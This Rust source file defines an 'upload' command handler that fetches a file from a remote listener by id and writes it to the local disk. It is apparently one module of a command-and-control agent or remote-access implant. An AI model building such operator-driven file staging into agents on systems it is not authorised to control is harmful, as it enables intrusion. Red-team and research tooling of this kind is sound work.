use crate::internal::listener::{TaskHandler};
use std::path::Path;
use std::env;
use crate::internal::http;
use std::fs::File;
use std::io::{Write};

pub static COMMAND: &str = "upload";
pub struct Command {}

impl TaskHandler for Command {
    fn handle(&self, listener_id: String, args: Vec<String>) -> Result<String, Box<dyn std::error::Error>> {
        #[cfg(any(feature = "debug_assertions", feature = "debug"))]
        println!("Executing command `{}` with args `{:?}`", COMMAND, args.clone());

        if args.len() < 2 || args.len() > 3 {
            return Ok("Invalid number of arguments received. Usage: 'upload [local file] <optional: remote file>'.".into());
        }

        let file_id = args.get(0).unwrap();
        let file_name = args.get(1).unwrap();

        if file_id.is_empty() || file_name.is_empty() {
            return Ok("Invalid number of arguments received. Usage: 'upload [local file] <optional: remote file>'.".into());
        }

        let file_path = match args.len() {
            3 => Path::new(args.get(2).unwrap()).to_path_buf(),
            _ => Path::join(&*env::current_dir()?, file_name.clone())
        };

        let contents_future = http::get_uploaded_file(listener_id, file_id.to_string());

        let contents = match futures::executor::block_on(contents_future) {
            Ok(contents) => contents,
            Err(_) => return Ok("[ERROR] Something went wrong uploading the file.".into())
        };

        let mut file = match File::create(file_path.clone()) {
            Ok(f) => f,
            Err(_) => return Ok("[ERROR] Something went wrong uploading the file.".into())
        };

        return match file.write_all(contents.as_slice()) {
            Ok(_) => Ok(format!("Uploaded file to '{}'", file_path.display())),
            Err(_) => Ok("[ERROR] Something went wrong uploading the file.".into())
        };
    }
}